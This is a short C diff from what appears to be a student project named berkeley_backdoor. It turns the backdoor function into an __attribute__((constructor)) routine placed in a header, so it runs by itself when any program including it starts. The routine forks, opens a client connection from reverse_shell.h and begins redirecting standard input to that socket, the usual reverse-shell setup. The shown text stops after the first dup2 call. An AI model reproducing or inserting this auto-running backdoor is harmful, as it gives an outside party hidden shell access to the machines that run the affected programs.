@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   berkeley_backdoor.c                                :+:      :+:    :+:   */
+/*   berkeley_backdoor.h                                :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: joesanto <joesanto@student.42porto.com>    +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/01/10 17:29:38 by joesanto          #+#    #+#             */
-/*   Updated: 2026/01/10 17:54:42 by joesanto         ###   ########.fr       */
+/*   Updated: 2026/01/10 19:14:00 by joesanto         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,12 +14,14 @@
 #include <stdlib.h>
 #include "reverse_shell.h"
 
-int	berkeley_backdoor(void)
+__attribute__((constructor))
+static inline
+void	berkeley_backdoor(void)
 {
 	int	client_fd;
 
 	if (fork() != 0)
-		return (1);
+		return ;
 	if (berkeley_client_connection(&client_fd) != 0)
 		exit(1);
 	if (dup2(client_fd, STDIN_FILENO) == -1)
